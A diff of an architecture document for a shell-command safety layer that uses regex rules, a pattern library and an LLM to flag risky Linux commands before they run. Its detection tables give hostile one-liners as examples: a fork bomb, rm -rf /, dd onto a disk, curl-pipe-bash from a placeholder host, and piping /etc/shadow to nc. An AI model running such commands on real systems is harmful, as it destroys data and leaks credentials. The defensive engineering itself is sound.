@@ -1,350 +1,299 @@
 # AI System Intent Engine — Architecture
 
-## System Overview
+## 1. System Overview
 
-The AI System Intent Engine is a transparent, user-controlled AI safety layer that intercepts Linux shell commands before execution. It uses a three-tier decision pipeline to classify command intent and risk level, then presents an interactive terminal UI to the user for high-risk commands.
+```mermaid
+graph TB
+    User["👤 User<br/>(Linux Shell)"]
 
----
+    subgraph Shell["Shell Layer (Zsh/Bash)"]
+        ZSH["ZLE accept-line<br/>hook override"]
+        AC["Intent Copilot<br/>Ghost-text autocomplete"]
+    end
 
-## High-Level Architecture
+    subgraph Daemon["Intent Engine Daemon (FastAPI + Unix Socket)"]
+        direction TB
+        Router["Verdict Router"]
 
-```
-┌──────────────────────────────────────────────────────────────────────┐
-│                         User Shell Session                          │
-│                                                                      │
-│   $ sudo rm -rf /opt/database   ← user presses Enter               │
-│          │                                                           │
-│          ▼ (Zsh: accept-line ZLE hook, Bash: DEBUG trap)            │
-│   Shell hook sends command to daemon via Unix socket                 │
-└──────────────────────────┬───────────────────────────────────────────┘
-                           │  HTTP POST /analyze
-                           │  (Unix domain socket: /tmp/intent_engine.sock)
-                           ▼
-┌──────────────────────────────────────────────────────────────────────┐
-│                     Intent Engine Daemon                            │
-│              (FastAPI + Uvicorn, async, single-process)             │
-│                                                                      │
-│  ┌─────────────┐   ┌──────────────────┐   ┌──────────────────────┐ │
-│  │   Command   │   │   Rule Engine    │   │    LLM Reasoner      │ │
-│  │   Parser    │──▶│   Tier 0 + 1    │──▶│   Tier 2 (Gemini)    │ │
-│  │   (shlex)   │   │   (TOML+regex)  │   │   + LRU Cache (128)  │ │
-│  └─────────────┘   └──────────────────┘   └──────────────────────┘ │
-│         │                  │                         │              │
-│         │          SAFE/HIGH/CRITICAL         AMBIGUOUS only        │
-│         │          returned directly           escalated to LLM     │
-│         └──────────────────┴─────────────────────────┤             │
-│                                                       ▼             │
-│                                           ┌──────────────────────┐ │
-│                                           │   Verdict Router     │ │
-│                                           │   (risk threshold    │ │
-│                                           │    comparison)       │ │
-│                                           └──────────┬───────────┘ │
-└──────────────────────────────────────────────────────│──────────────┘
-                                                       │
-                   ┌───────────────────────────────────┤
-                   │                                   │
-                   ▼                                   ▼
-         risk >= block_threshold               risk < block_threshold
-                   │                                   │
-                   ▼                                   ▼
-        ┌──────────────────┐               ┌──────────────────────┐
-        │   Terminal UI    │               │  Command ALLOWED     │
-        │ (ANSI 256-color) │               │  Shell continues     │
-        │ Risk + Intent    │               └──────────────────────┘
-        │ Safer alt        │
-        │ [y/n/s] choice   │
-        └────────┬─────────┘
-                 │
-      ┌──────────┴──────────┐
-      │                     │
-      ▼                     ▼
- User: [y/s]          User: [n]
- Command executes      Command aborted
-      │                     │
-      └──────────┬──────────┘
-                 ▼
-      ┌──────────────────────┐
-      │   Audit Logger       │
-      │   ~/.intent_engine/  │
-      │   logs/audit.jsonl   │
-      └──────────────────────┘
+        subgraph Pipeline["Three-Tier Decision Pipeline"]
+            T0["Tier 0<br/>Hardcoded Regex<br/>< 1ms"]
+            T1["Tier 1<br/>TOML Pattern Library<br/>41 patterns · < 50ms"]
+            T2["Tier 2<br/>Gemini 3.6 Flash<br/>LRU Cache · < 2s"]
+        end
+
+        T0 -->|"AMBIGUOUS"| T1
+        T1 -->|"AMBIGUOUS"| T2
+    end
+
+    subgraph Output["Output Layer"]
+        UI["Terminal UI<br/>ANSI 256-color prompt<br/>[y/n/s]"]
+        Audit["Audit Logger<br/>~/.intent_engine/logs/audit.jsonl"]
+        Allow["Shell continues<br/>Command executes"]
+    end
+
+    User -->|"types command"| AC
+    AC -.->|"ghost-text"| User
+    User -->|"presses Enter"| ZSH
+    ZSH -->|"HTTP POST /analyze<br/>Unix Socket"| Router
+    Router --> Pipeline
+    Pipeline --> Router
+    Router -->|"risk >= threshold"| UI
+    Router -->|"risk < threshold"| Allow
+    UI -->|"user chooses"| Audit
+    Allow --> Audit
+
+    style T0 fill:#c0392b,color:#fff
+    style T1 fill:#e67e22,color:#fff
+    style T2 fill:#2980b9,color:#fff
+    style UI fill:#27ae60,color:#fff
+    style Audit fill:#8e44ad,color:#fff
 ```
 
 ---
 
-## Three-Tier Decision Pipeline
+## 2. Three-Tier Decision Pipeline
 
-### Tier 0 — Structural Safety Checks (< 1ms)
+```mermaid
+flowchart TD
+    CMD(["Raw Command<br/>e.g. sudo rm -rf /opt/db"])
 
-Hardcoded regex patterns, zero TOML lookup, always runs first. If matched, the command is immediately returned as `CRITICAL` without invoking any further processing.
+    CMD --> PRE["Command Parser<br/>shlex · AST · alias resolution"]
 
-**Covered patterns (hardcoded, not configurable):**
-| Pattern | Example |
-|---------|---------|
-| Fork bomb | `:(){ :|:& };:` |
-| rm targeting filesystem root | `rm -rf /`, `rm -rf /*` |
-| dd writing to raw block device | `dd if=/dev/zero of=/dev/sda` |
-| curl-pipe-bash (remote code execution) | `curl http://x.sh \| bash` |
-| wget-pipe-bash | `wget -qO- http://x.sh \| sh` |
+    PRE --> T0{"Tier 0<br/>Hardcoded Regex<br/>Fork bomb · rm -rf / · dd to device<br/>curl|bash"}
 
-### Tier 1 — TOML Pattern Library (< 50ms)
+    T0 -->|"MATCH"| CRIT["CRITICAL Verdict<br/>< 1ms · 100% confidence"]
 
-A curated library of **41 patterns** loaded from `rules/dangerous_patterns.toml`. Each pattern carries:
-- `name`: unique identifier
-- `tier`: 0 or 1
-- `risk_level`: CRITICAL / HIGH / MEDIUM / LOW
-- `category`: destruction / storage / privilege / network / exposure / tampering / execution
-- `regex`: tested against the full raw command
-- `flags_required`: all flags that must be present
-- `path_pattern`: optional path-level regex
-- `reasoning_template`: plain-language explanation
-- `impact_template`: one-sentence impact for user display
-- `safer_alternative`: suggested safer command
+    T0 -->|"NO MATCH"| T1{"Tier 1<br/>TOML Pattern Library<br/>41 patterns · confidence scoring"}
 
-**Confidence Scoring:**
-Each Tier 1 match generates a confidence score (0.0–1.0) based on:
-- Base pattern confidence
-- `is_sudo`: +0.15
-- Path targeting critical system prefix: +0.20
-- Flags present: +0.10 per relevant flag
-- CWD proximity to dangerous path: +0.05
+    T1 -->|"HIGH confidence<br/>match"| VERDICT1["Definitive Verdict<br/>SAFE / LOW / MEDIUM / HIGH / CRITICAL<br/>< 50ms"]
 
-If confidence ≥ threshold → return verdict directly  
-If confidence < threshold → return `AMBIGUOUS` → escalate to Tier 2
+    T1 -->|"confidence < threshold<br/>AMBIGUOUS"| CACHE{"LRU Cache<br/>128 entries<br/>MD5 key on raw command"}
 
-**Pattern Categories (Tier 1):**
-| Category | Example Patterns |
-|----------|-----------------|
-| destruction | `rm -rf` on `/var`, `/etc`, `/home` |
-| storage | Shred, secure-delete, disk overwrite |
-| privilege | `chmod 777 /etc`, `visudo` modification |
-| network | `nc` with data piping, exfil via curl |
-| exposure | `cat /etc/shadow`, `/proc/kcore` access |
-| tampering | History wipe, `.bashrc` modification |
-| execution | Base64-encoded scripts, obfuscated eval |
+    CACHE -->|"HIT"| CACHED["Cached Verdict<br/>< 1ms"]
+    CACHE -->|"MISS"| T2["Tier 2<br/>Gemini 3.6 Flash API<br/>Structured JSON response<br/>~800ms – 2s"]
 
-### Tier 2 — LLM Semantic Reasoning (< 2s with Gemini)
+    T2 --> PARSE["ResponseParser<br/>JSON schema validation"]
+    PARSE --> STORE["Store in LRU cache"]
+    STORE --> VERDICT2["LLM Verdict<br/>risk · confidence · reasoning<br/>impact · safer alternative"]
 
-Only invoked when Tier 1 returns `AMBIGUOUS`. Sends a structured prompt to the configured LLM provider.
+    CRIT --> ROUTER
+    VERDICT1 --> ROUTER
+    CACHED --> ROUTER
+    VERDICT2 --> ROUTER
 
-**LRU Cache:** A session-scoped 128-entry LRU cache ensures repeated commands are answered in < 1ms without re-calling the API.
+    ROUTER{"Verdict Router<br/>compare risk_level<br/>to block_threshold"}
+    ROUTER -->|"risk >= threshold"| BLOCK["Render Terminal UI<br/>Wait for [y/n/s]"]
+    ROUTER -->|"risk < threshold"| PASS["Allow execution"]
 
-**Response Schema (strict JSON):**
-```json
-{
-  "risk_level": "HIGH",
-  "confidence": 0.91,
-  "intent": "Permanently deletes the /opt/custom_app_database directory",
-  "impact_summary": "All database files, configurations, and indexes will be unrecoverably destroyed.",
-  "reasoning": "sudo + rm -rf targeting /opt/ indicates an administrative destructive operation.",
-  "safer_alternative": "mv /opt/custom_app_database /opt/custom_app_database.bak",
-  "safer_alternative_explanation": "Moves the directory to a backup location instead of deleting it."
-}
+    style CRIT fill:#c0392b,color:#fff
+    style T0 fill:#c0392b,color:#fff,stroke:#922b21
+    style T1 fill:#e67e22,color:#fff,stroke:#a04000
+    style T2 fill:#2980b9,color:#fff,stroke:#1a5276
+    style CACHE fill:#16a085,color:#fff
+    style BLOCK fill:#27ae60,color:#fff
 ```
 
 ---
 
-## Component Architecture
+## 3. Shell Hook Integration
 
-### Command Parser (`engine/parser/`)
+```mermaid
+sequenceDiagram
+    participant U as User
+    participant ZSH as Zsh Shell
+    participant H as intent_hook.zsh<br/>(accept-line override)
+    participant D as Daemon<br/>/tmp/intent_engine.sock
+    participant UI as terminal_ui.py
 
-Parses raw shell input into a structured `ParsedCommand` AST.
+    U->>ZSH: types "sudo rm -rf /opt/db" + Enter
+    ZSH->>H: accept-line fires (before execution)
+    H->>D: curl POST /analyze (JSON payload)
+    Note over H,D: synchronous — shell is paused
 
-```
-raw: "sudo rm -rf /opt/db && echo done"
-          │
-          ▼
-     ParsedCommand
-       .base_command = "rm"
-       .args = ["-rf", "/opt/db"]
-       .flags = {"-r": True, "-f": True}
-       .is_sudo = True
-       .chain_segments = [seg1("rm -rf /opt/db"), seg2("echo done")]
-       .target_paths = ["/opt/db"]
-       .redirects = []
-       .pipes = []
-```
+    alt Risk >= block_threshold
+        D-->>H: {"should_block": true, "verdict": {...}}
+        H->>UI: pipe verdict JSON to terminal_ui.py
+        UI-->>U: render ANSI risk prompt [y/n/s]
+        U-->>UI: chooses 'n' (abort)
+        UI-->>H: exit code = ABORT
+        H->>ZSH: discard command, return to prompt
+    else Risk < block_threshold
+        D-->>H: {"should_block": false, "verdict": {...}}
+        H->>ZSH: call .accept-line (execute normally)
+    end
 
-**Handles:**
-- Pipelines (`cmd1 | cmd2`)
-- Chained commands (`&&`, `||`, `;`)
-- Subshell expansion (`$(...)`, `` `...` ``)
-- Redirections (`>`, `>>`, `2>&1`)
-- Alias resolution
-- Quote and escape handling
-
-### Rule Engine (`engine/rule_engine/`)
-
-```
-PatternLoader  →  loads and validates dangerous_patterns.toml on startup
-     │
-     ▼
-PatternMatcher →  runs Tier 0 structural checks first
-     │            then iterates Tier 1 TOML patterns
-     │            computes confidence-weighted verdict
-     ▼
-ObfuscationDetector → catches base64, hex, variable-expansion tricks
-     │
-     ▼
-VerdictBuilder →  constructs final Verdict object with impact/alternatives
-```
-
-### LLM Reasoner (`engine/llm/`)
-
-```
-LLMClientFactory  →  resolves provider from config ("gemini" | "ollama" | "openai")
-     │
-     ▼
-GeminiClient      →  google-genai SDK, async via executor
-     │
-     ▼
-PromptBuilder     →  constructs system + user prompts from ParsedCommand
-     │
-     ▼
-ResponseParser    →  validates JSON schema, handles partial responses
-     │
-     ▼
-SaferAlternativeSuggester → curated lookup table + LLM fallback (no 2nd API call)
-     │
-     ▼
-_LRUVerdictCache  →  128-entry session cache, MD5 key on raw command
-```
-
-### Terminal UI (`engine/ui/terminal_ui.py`)
-
-Reads the daemon JSON response from stdin, renders the ANSI 256-color confirmation prompt to stderr, reads user input from `/dev/tty` (bypasses stdin redirect), and prints the decision (`EXECUTE`, `ABORT`, `USE_SAFER`) to stdout for the shell hook to consume.
-
-### Audit Logger (`engine/audit/`)
-
-Appends a structured JSONL record for every flagged command to `~/.intent_engine/logs/audit.jsonl`. Records include timestamp, command, risk level, confidence, pattern, tier, user action, user, cwd, session ID, and latency.
-
----
-
-## Shell Integration
-
-### Zsh Hook (`hooks/intent_hook.zsh`)
-
-```zsh
-# Overrides the ZLE accept-line widget
-# Fires synchronously before execution — cannot be bypassed by normal shell usage
-function _intent_accept_line() {
-    # 1. Send command to daemon via curl --unix-socket
-    # 2. If should_block = true → pipe response to terminal_ui.py
-    # 3. Read user decision
-    # 4. EXECUTE / ABORT / USE_SAFER based on decision
-}
-zle -N accept-line _intent_accept_line
-```
-
-**Zsh hook guarantees:**
-- Fires before any execution (synchronous ZLE override)
-- Works with pipelines, chained commands, and aliases
-- Can be bypassed per-command with `INTENT_ENGINE_ENABLED=0`
-
-### Bash Hook (`hooks/intent_hook.bash`)
-
-```bash
-# Uses DEBUG trap — fires before each command
-trap '_intent_check "$BASH_COMMAND"' DEBUG
-```
-
-**Known limitation:** Bash `DEBUG` trap is not truly synchronous for all command types. In complex scripts, some commands may execute before the trap fires.
-
----
-
-## Data Flow Diagram
-
-```
-User Input
-    │
-    ▼
-[Shell Hook] ──────────────────────────► [Daemon: /analyze endpoint]
-                  HTTP POST                         │
-                  Unix Socket                       │
-                                          ┌─────────▼──────────┐
-                                          │  Command Parser    │
-                                          │  shlex + AST       │
-                                          └─────────┬──────────┘
-                                                    │
-                                          ┌─────────▼──────────┐
-                                          │  Pre-scan (Tier 0) │
-                                          │  Full raw command  │
-                                          └─────────┬──────────┘
-                                                    │
-                                          CRITICAL? YES ──► Return CRITICAL verdict
-                                                    │ NO
-                                                    │
-                                          ┌─────────▼──────────┐
-                                          │  Tier 1: Pattern   │
-                                          │  Library (TOML)    │
-                                          │  Per chain segment │
-                                          └─────────┬──────────┘
-                                                    │
-                                          AMBIGUOUS? NO ──► Return verdict
-                                                    │ YES
-                                                    │
-                                          ┌─────────▼──────────┐
-                                          │  Tier 2: Gemini    │
-                                          │  LRU cache check   │
-                                          │  LLM if cache miss │
-                                          └─────────┬──────────┘
-                                                    │
-                                          ┌─────────▼──────────┐
-                                          │  Verdict Router    │
-                                          │  Compare to        │
-                                          │  block_threshold   │
-                                          └─────────┬──────────┘
-                                                    │
-                                     ┌──────────────┴─────────────┐
-                                     │                            │
-                              should_block=true            should_block=false
-                                     │                            │
-                                     ▼                            ▼
-                             [Hook: run terminal_ui]      [Hook: allow execution]
-                                     │
-                             [User: y/n/s]
-                                     │
-                             [Audit Logger]
+    H->>D: POST /audit (fire-and-forget)
 ```
 
 ---
 
-## Performance Characteristics
+## 4. Autocomplete (CLI Copilot) Flow
 
-| Scenario | Latency | Notes |
-|----------|---------|-------|
-| Tier 0 match (fork bomb, rm -rf /) | < 1ms | Pure regex, no I/O |
-| Tier 1 match (TOML pattern) | 5–50ms | Pattern scan + confidence scoring |
-| Tier 2 cache hit (LRU) | < 1ms | MD5 hash lookup |
-| Tier 2 cache miss (Gemini API) | 500ms–2s | Depends on network, Gemini load |
-| Tier 2 cache miss (Ollama, GPU) | 2–5s | Depends on model size + VRAM |
-| Tier 2 cache miss (Ollama, CPU) | 30–90s | Not recommended for production |
+```mermaid
+flowchart LR
+    KEY["Keystroke<br/>(self-insert ZLE widget)"]
+
+    KEY --> LEN{"len(buffer) ≥ 3?"}
+    LEN -->|"No"| NONE["No suggestion"]
+
+    LEN -->|"Yes"| LOCAL{"Tier A<br/>Local Dict lookup<br/>400+ entries<br/>pure Zsh associative array"}
+
+    LOCAL -->|"HIT"| GHOST["Show ghost-text<br/>via POSTDISPLAY<br/>0ms · This keypress"]
+
+    LOCAL -->|"MISS"| ASYNC["Fire async fetch<br/>(non-blocking)"]
+
+    ASYNC --> APICALL["POST /autocomplete<br/>Daemon → Gemini API<br/>~600ms"]
+
+    APICALL --> CB["_iac_llm_cb<br/>ZLE file descriptor callback"]
+    CB --> GHOST2["Show ghost-text<br/>when result arrives"]
+
+    GHOST --> TAB{"User presses Tab?"}
+    GHOST2 --> TAB
+
+    TAB -->|"Yes"| ACCEPT["BUFFER = full suggestion<br/>POSTDISPLAY = ''"]
+    TAB -->|"No (ESC)"| DISMISS["Clear ghost-text"]
+    TAB -->|"No (Enter)"| SAFETY["Chain to<br/>intent_hook.zsh<br/>(safety engine)"]
+
+    style LOCAL fill:#16a085,color:#fff
+    style APICALL fill:#2980b9,color:#fff
+    style GHOST fill:#27ae60,color:#fff
+    style GHOST2 fill:#27ae60,color:#fff
+    style SAFETY fill:#e67e22,color:#fff
+```
 
 ---
 
-## LLM Provider Details
+## 5. LLM Reasoning Component
 
-| Provider | Model | SDK | Latency | Setup |
-|----------|-------|-----|---------|-------|
-| **Gemini (default)** | gemini-3.6-flash | `google-genai` | ~800ms–2s | API key via `INTENT_GEMINI_API_KEY` |
-| Ollama (local) | any GGUF model | `httpx` (REST) | 2–90s | `ollama serve` + model pull |
-| OpenAI | gpt-4o-mini | `openai` SDK | ~1–3s | API key via `INTENT_OPENAI_API_KEY` |
+```mermaid
+flowchart TD
+    INPUT["ParsedCommand + CommandContext + rule_hint"]
 
-**No fine-tuning is applied to any model.** All models are used with carefully engineered prompts via zero-shot prompting. The Gemini model is not customized — it is the standard `gemini-3.6-flash` endpoint provided by Google AI Studio.
+    INPUT --> CACHE_CHECK{"LRU Verdict Cache<br/>128 entries<br/>keyed on MD5(raw_command)"}
+
+    CACHE_CHECK -->|"HIT"| RETURN_CACHE["Return cached Verdict<br/>< 1ms"]
+
+    CACHE_CHECK -->|"MISS"| PROMPT["PromptBuilder<br/>System prompt: schema + rules<br/>User prompt: command + context + hint<br/>~350 tokens total"]
+
+    PROMPT --> GEMINI["GeminiClient<br/>google-genai SDK<br/>model: gemini-3.6-flash<br/>response_mime_type: application/json<br/>temperature: 0.1<br/>runs in executor (async)"]
+
+    GEMINI --> PARSE["ResponseParser<br/>JSON schema validation<br/>risk_level · confidence<br/>reasoning · impact · safer_alt"]
+
+    PARSE --> SUGGEST["SaferAlternativeSuggester<br/>Curated lookup table first<br/>LLM output as fallback<br/>No second API call"]
+
+    SUGGEST --> BUILD["Build final Verdict"]
+    BUILD --> STORE_CACHE["Store in LRU cache<br/>(if not AMBIGUOUS)"]
+    STORE_CACHE --> RETURN_LLM["Return Verdict"]
+
+    style GEMINI fill:#2980b9,color:#fff
+    style CACHE_CHECK fill:#16a085,color:#fff
+    style RETURN_CACHE fill:#16a085,color:#fff
+```
 
 ---
 
-## Security Model
+## 6. Rule Engine Component (Tier 0 + Tier 1)
 
-**What the engine protects against:**
-- Accidental execution of catastrophically destructive commands
-- Common one-liner attacks (`curl | bash`, reverse shells via `nc`)
-- Credential exfiltration (`cat /etc/shadow | nc ...`)
-- History tampering (`history -c`)
-- Obfuscated commands (base64, hex encoding)
+```mermaid
+flowchart TD
+    RAW["Raw command string"]
 
-**What the engine does NOT protect against:**
-- Kernel exploits or root-level privilege escalation
-- Commands executed outside the monitored shell (other terminals, cron jobs, scripts)
-- A determined attacker with shell access who can `unset` the hook
-- Compiled binaries or direct syscalls bypassing the shell entirely
+    RAW --> PARSER["CommandParser<br/>shlex · pipeline · redirect · subshell AST<br/>alias resolution"]
+
+    PARSER --> OBF["ObfuscationDetector<br/>base64 · hex · variable expansion<br/>eval · backtick nesting"]
+
+    OBF --> T0["Tier 0 Structural Checks<br/>Hardcoded regex — no TOML<br/>_FORK_BOMB_RE · _RM_ROOT_RE<br/>_DD_DEVICE_RE · _CURL_PIPE_RE"]
+
+    T0 -->|"MATCH"| CRIT_VERDICT["CRITICAL Verdict<br/>confidence=1.0<br/>< 1ms"]
+
+    T0 -->|"NO MATCH"| PER_SEG["Per-segment iteration<br/>(handles pipelines A | B | C)"]
+
+    PER_SEG --> TOML["TOML Pattern Matcher<br/>41 patterns loaded at startup<br/>hot-reloadable via /reload-rules"]
+
+    TOML --> SCORE["Confidence Scorer<br/>base_confidence<br/>+0.15 if is_sudo<br/>+0.20 if path in critical prefixes<br/>+0.10 per relevant flag present<br/>+0.05 if cwd near dangerous path"]
+
+    SCORE --> THRESH{"confidence ≥<br/>ambiguous_threshold?"}
+
+    THRESH -->|"Yes"| DEFINITE["Definitive verdict<br/>SAFE · LOW · MEDIUM · HIGH · CRITICAL<br/>< 50ms"]
+
+    THRESH -->|"No"| AMB["AMBIGUOUS<br/>Escalate to Tier 2"]
+
+    style T0 fill:#c0392b,color:#fff
+    style TOML fill:#e67e22,color:#fff
+    style CRIT_VERDICT fill:#c0392b,color:#fff
+    style AMB fill:#2980b9,color:#fff
+```
+
+---
+
+## 7. Data Flow & Component Layers
+
+```mermaid
+graph LR
+    subgraph Infra["Infrastructure Layer"]
+        H1["engine/daemon/"]
+        H2["engine/parser/"]
+        H3["engine/ui/"]
+        H4["engine/audit/"]
+        H5["hooks/"]
+        H6["install.sh"]
+    end
+
+    subgraph Rules["Rule Engine Layer"]
+        P1["engine/rule_engine/"]
+        P2["rules/dangerous_patterns.toml"]
+    end
+
+    subgraph AI["AI Reasoning Layer"]
+        V1["engine/llm/"]
+        V2["engine/alternatives/"]
+        V3["engine/risk/"]
+        V4["engine/contracts/"]
+    end
+
+    H5 -->|"Unix socket POST"| H1
+    H1 -->|"ParsedCommand"| H2
+    H2 -->|"ParsedCommand"| P1
+    P1 -->|"Verdict / AMBIGUOUS"| H1
+    H1 -->|"AMBIGUOUS → reason()"| V1
+    V1 -->|"Verdict"| H1
+    H1 -->|"Verdict"| H3
+    H3 -->|"user decision"| H4
+    V4 -->|"shared schemas"| H1
+    V4 -->|"shared schemas"| P1
+    V4 -->|"shared schemas"| V1
+
+    style Infra fill:#1a252f,color:#fff,stroke:#2980b9
+    style Rules fill:#1a252f,color:#fff,stroke:#e67e22
+    style AI fill:#1a252f,color:#fff,stroke:#27ae60
+```
+
+---
+
+## 8. Audit Log Pipeline
+
+```mermaid
+flowchart LR
+    VERDICT["Final Verdict<br/>+ user decision"] --> LOGGER["AuditLogger<br/>engine/audit/"]
+
+    LOGGER --> JSONL["~/.intent_engine/logs/audit.jsonl<br/>append-only"]
+
+    JSONL --> FORMAT["JSON Record:<br/>timestamp · command · risk_level<br/>confidence · pattern · tier<br/>action · user · cwd<br/>session_id · latency_ms"]
+
+    FORMAT -.->|"future"| ANALYTICS["Analytics Dashboard<br/>(planned)"]
+
+    style LOGGER fill:#8e44ad,color:#fff
+    style JSONL fill:#2c3e50,color:#fff
+```
+
+---
+
+## 9. Performance Summary
+
+```mermaid
+xychart-beta
+    title "Latency by Tier (ms, log scale)"
+    x-axis ["Tier 0 (regex)", "Tier 1 (TOML)", "LRU Cache hit", "Tier 2 (Gemini)"]
+    y-axis "Latency (ms)" 0 --> 2000
+    bar [1, 50, 1, 1200]
+```
